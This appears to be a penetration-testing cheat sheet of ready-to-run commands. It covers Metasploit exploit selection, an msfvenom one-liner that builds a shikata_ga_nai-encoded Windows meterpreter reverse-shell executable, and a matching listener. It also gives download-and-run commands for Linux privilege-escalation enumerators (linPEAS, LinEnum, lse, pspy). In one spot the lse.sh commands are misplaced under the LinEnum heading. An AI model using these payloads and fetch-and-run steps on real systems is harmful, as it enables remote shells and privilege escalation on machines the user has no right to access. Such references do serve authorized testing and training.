# Exploitations

## Metasploit

To show all exploits that for a vulnerability
```
grep <vulnerability> show exploits
```

To select an exploit to use
```
use <exploit>
```

To see the current settings for a selected exploit
```
show options
```

To see compatible payloads for a selected exploit
```
show payloads
```

To set the payload for a selected exploit
```
set payload <payload>
```

To set setting for a selected exploit 
```
set <option> <value>
```

To run the exploit
```
exploit
```

One liner to create/generate a payload for windows
```
msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=<listening_host> LPORT=<listening_port> --bad-chars “\x00” --encoder x86/shikata_ga_nai --iterations 10 --format exe --out /path/
```

One liner start meterpreter
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
```

</br>

# Linux Enumeration - Tools

## PEASS - Privilege Escalation Awesome Scripts SUITE

```bash
wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

All checks - deeper system enumeration, but it takes longer to complete:

```bash
/tmp/linpeas.sh -a
```

Superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk:

```bash
/tmp/linpeas.sh -s
```

Password - Pass a password that will be used with sudo -l and bruteforcing other users:

```bash
/tmp/linpeas.sh -P
```

## linEnum - High-level summary of the checks/tasks performed

```bash
wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

Shows interesting information that should help you to privesc:

```bash
/tmp/lse.sh -l1
```

Dump all the information it gathers about the system:

```bash
/tmp/lse.sh -l2
```

## linux-smart-enumeration

```bash
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O /tmp/lse.sh
chmod +x /tmp/lse.sh
/tmp/lse.sh -l1
```

## pspy - unprivileged linux process snooping

### 32 bit

```bash
wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32" -O /tmp/pspy32
chmod +x /tmp/pspy32
/tmp/pspy32 -l1
```

### 64 bit

```bash
wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -l1
```
